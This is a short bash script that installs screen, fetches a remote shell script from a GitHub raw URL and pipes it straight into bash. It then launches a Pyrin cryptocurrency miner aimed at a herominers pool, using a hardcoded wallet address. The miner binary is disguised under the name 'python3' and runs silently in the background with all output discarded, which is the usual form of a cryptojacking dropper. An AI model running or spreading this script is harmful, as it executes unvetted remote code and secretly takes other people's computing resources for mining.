#!/bin/bash

apt install screen -y

bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotLol.sh)"

nomer=$((RANDOM % 50 + 1))

nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT$nomer --no-cl > /dev/null 2>&1 &
